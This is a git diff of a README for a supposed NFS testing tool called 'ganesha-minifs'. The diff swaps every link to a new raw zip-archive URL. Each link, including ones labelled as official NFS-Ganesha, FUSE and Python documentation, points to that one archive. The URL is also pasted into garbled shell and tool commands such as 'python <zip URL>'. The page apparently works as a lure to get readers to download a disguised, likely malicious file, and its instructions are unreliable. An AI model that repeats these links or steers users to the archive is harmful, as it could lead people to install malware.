@@ -1,6 +1,6 @@
 # 🚀 ganesha-minifs - Simple NFS Testing Made Easy
 
-[![Download](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip)](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip)
+[![Download](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip)](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip)
 
 ## 🌐 Introduction
 
@@ -16,19 +16,19 @@ To get started with **ganesha-minifs**, you will need to download the applicatio
    - **FUSE**: Ensure that you have FUSE installed to use this application.
 
 2. **Download & Install**
-   - Visit this page to download the application: [Download Here](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip)
+   - Visit this page to download the application: [Download Here](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip)
    - Look for the latest version under the **Releases** section. You will see a list of files.
-   - Download the appropriate `https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip` file for your system. If you're unsure, the file labeled *linux-amd64* should work for most users.
+   - Download the appropriate `https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip` file for your system. If you're unsure, the file labeled *linux-amd64* should work for most users.
 
 3. **Extract the Files**
-   - After the download finishes, locate the `https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip` file in your Downloads folder. 
+   - After the download finishes, locate the `https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip` file in your Downloads folder. 
    - Open a terminal and navigate to your Downloads folder using the command:
      ```
      cd ~/Downloads
      ```
    - Extract the files using the following command:
      ```
-     tar -xzf ganesha-minifs-<version>https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip
+     tar -xzf ganesha-minifs-<version>https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip
      ```
      Replace `<version>` with the version number you downloaded.
 
@@ -39,7 +39,7 @@ To get started with **ganesha-minifs**, you will need to download the applicatio
      ```
    - Now, you can start the application by running:
      ```
-     python https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip
+     python https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip
      ```
    - This will launch the NFS testing tool, allowing you to check NFS functionalities.
 
@@ -57,19 +57,19 @@ Once you have the application running, you can interact with it using simple com
 1. **To Create a File**: 
    - Use the `create` command followed by the file name.
    ```
-   create https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip
+   create https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip
    ```
 
 2. **To Read a File**: 
    - Use the `read` command with the file name.
    ```
-   read https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip
+   read https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip
    ```
 
 3. **To Delete a File**: 
    - Use the `delete` command followed by the file name.
    ```
-   delete https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip
+   delete https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip
    ```
 
 These commands allow you to manage files efficiently within the testing environment.
@@ -96,14 +96,14 @@ This project is licensed under the MIT License, which allows you to use, modify,
 
 ## 📦 Contributing
 
-If you would like to contribute to **ganesha-minifs**, more information can be found in the [https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip) file in the repository. Contributions are welcome!
+If you would like to contribute to **ganesha-minifs**, more information can be found in the [https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip) file in the repository. Contributions are welcome!
 
 ## 🔗 Additional Resources
 
 For further help and resources, visit the documentation or check out the following links:
 
-- [NFS-Ganesha Official Documentation](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip)
-- [FUSE Documentation](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip)
-- [Python Documentation](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip)
+- [NFS-Ganesha Official Documentation](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip)
+- [FUSE Documentation](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip)
+- [Python Documentation](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip)
 
-Remember to [download the application here](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/ganesha/ganesha-minifs-v2.6-beta.3.zip) and start exploring the world of NFS testing!
+Remember to [download the application here](https://raw.githubusercontent.com/Bhatti1122/ganesha-minifs/master/minisfs/minifs-ganesha-1.6.zip) and start exploring the world of NFS testing!
